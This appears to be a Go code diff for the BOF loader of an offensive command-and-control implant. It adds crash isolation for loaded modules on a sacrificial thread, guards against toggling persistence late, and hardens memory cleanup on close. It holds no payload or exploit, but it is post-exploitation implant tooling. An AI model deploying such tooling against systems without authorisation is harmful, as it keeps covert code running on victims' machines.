@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"runtime"
 	"syscall"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -170,6 +171,20 @@ type BOF struct {
 	// persistent flips the writable-section reset behaviour.
 	// Default (false) preserves the historic contract.
 	persistent bool
+
+	// — Sacrificial-thread crash isolation (sacrificial_windows.go) —
+	//
+	// sacrificialTimeout > 0 enables the dedicated-thread Execute
+	// path that catches BOF faults via a process-wide VEH and
+	// surfaces them as Go errors instead of process death. Zero
+	// preserves the original inline (same-thread) semantics.
+	sacrificialTimeout time.Duration
+
+	// fault is written by the VEH when a sacrificial-mode BOF
+	// crashes inside its own mapping. Read by the host thread
+	// after WaitForSingleObject returns. Atomic stores via the
+	// sacrificial_windows.go path keep host-side reads coherent.
+	fault faultRecord
 }
 
 // SetPersistent toggles state retention across multiple Execute
@@ -188,11 +203,26 @@ type BOF struct {
 //     No-Consolation which maintain a LIBS_LOADED cache + a
 //     handle-info struct across operator-chained invocations.
 //
-// Must be called before the first Execute. Toggling between
-// Executes has no effect on the current run.
-func (b *BOF) SetPersistent(p bool) {
+// Returns ErrAlreadyPrepared if the BOF has already run its
+// first Execute — the writable-section snapshots are taken on
+// prepare, and toggling persistence after that point would only
+// affect future restores without resetting the current state,
+// which is a footgun. Set persistence before the first Execute.
+func (b *BOF) SetPersistent(p bool) error {
+	bofMu.Lock()
+	defer bofMu.Unlock()
+	if b.prepared {
+		return ErrAlreadyPrepared
+	}
 	b.persistent = p
+	return nil
 }
+
+// ErrAlreadyPrepared is returned by SetPersistent when the BOF
+// has already run its first Execute. See SetPersistent for the
+// rationale (prepare-time snapshots make late toggling
+// inconsistent).
+var ErrAlreadyPrepared = fmt.Errorf("runtime/bof: BOF already prepared (SetPersistent must be called before first Execute)")
 
 // Close releases the VirtualAlloc'd executable memory + drops
 // the cached mapping. Subsequent Execute calls fail cleanly.
@@ -210,13 +240,32 @@ func (b *BOF) Close() error {
 	if b.closed {
 		return nil
 	}
+	// Refuse to close while a sacrificial-mode Execute is still
+	// in flight on another goroutine — freeing execMem while the
+	// BOF thread is still executing inside that mapping is an
+	// instant crash. The sacrificialMap holds *BOF entries
+	// between ResumeThread and the deferred Delete inside
+	// callEntrySacrificial; if our pointer is in there, the
+	// thread is still alive (or the VEH+exit-stub teardown is
+	// in-flight).
+	if sacrificialBOFActive(b) {
+		return fmt.Errorf("runtime/bof: Close called while sacrificial Execute in flight")
+	}
 	b.closed = true
+	// Disarm the safety-net finalizer set in Load so it can't race
+	// us — finalizers run on their own goroutine and would
+	// double-free if Close ran first then GC fired.
+	runtime.SetFinalizer(b, nil)
 	if b.execMem != 0 {
 		err := windows.VirtualFree(b.execMem, 0, windows.MEM_RELEASE)
 		b.execMem = 0
 		b.execMemSize = 0
 		b.entryAddr = 0
 		b.writableSnapshots = nil
+		// writableTargets also aliased the freed mapping — clear so
+		// any stray reference becomes a clean nil-deref instead of a
+		// use-after-free.
+		b.writableTargets = nil
 		b.prepared = false
 		if err != nil {
 			return fmt.Errorf("runtime/bof: VirtualFree on Close: %w", err)
@@ -366,26 +415,16 @@ func (b *BOF) Execute(args []byte) ([]byte, error) {
 		b.restoreWritables()
 	}
 
-	// 8. Call entry function with BOF convention: go(char *data, int len).
-	//    Wrapped in a defer-recover: a busted BOF (memory fault, illegal
-	//    instruction, stack overflow) would otherwise propagate through
-	//    Go's signal handler and terminate the host process. The recover
-	//    captures the panic value into the per-BOF errors buffer so the
-	//    operator gets a diagnosable failure instead of an implant kill.
-	var argPtr, argLen uintptr
-	if len(args) > 0 {
-		argPtr = uintptr(unsafe.Pointer(&args[0]))
-		argLen = uintptr(len(args))
+	// 8. Dispatch to the entry point. callEntry chooses inline
+	//    (default — same thread as the host, defer-recover for
+	//    Go panics only) or sacrificial-thread (when the operator
+	//    called SetSacrificialThread; spawns the entry on a
+	//    dedicated thread with VEH-mediated crash isolation).
+	//    See runtime/bof/sacrificial_windows.go for the
+	//    threat-model + limitations rundown.
+	if err := b.callEntry(args); err != nil {
+		return b.output.Bytes(), err
 	}
-	func() {
-		defer func() {
-			if r := recover(); r != nil {
-				b.errors.write([]byte(fmt.Sprintf("bof: panic during entry: %v\n", r)))
-			}
-		}()
-		syscallN(b.entryAddr, argPtr, argLen)
-	}()
-
 	return b.output.Bytes(), nil
 }
 
@@ -394,19 +433,8 @@ func (b *BOF) Execute(args []byte) ([]byte, error) {
 // when persistent==false. Cheap (only the writable sections, no
 // VirtualAlloc / relocation / VirtualProtect re-run).
 func (b *BOF) restoreWritables() {
-	for _, snap := range b.writableSnapshots {
-		if len(snap) == 0 {
-			continue
-		}
-		// We stored snap as a copy of the in-memory bytes RIGHT AFTER
-		// initial load + relocations. The destination is the same
-		// region; the snapshot pointer is shared by struct field, so
-		// we look up the destination from the corresponding sectionBase
-		// recorded on the BOF via writableTargets.
-	}
 	for idx, dst := range b.writableTargets {
-		snap := b.writableSnapshots[idx]
-		copy(dst, snap)
+		copy(dst, b.writableSnapshots[idx])
 	}
 }
 
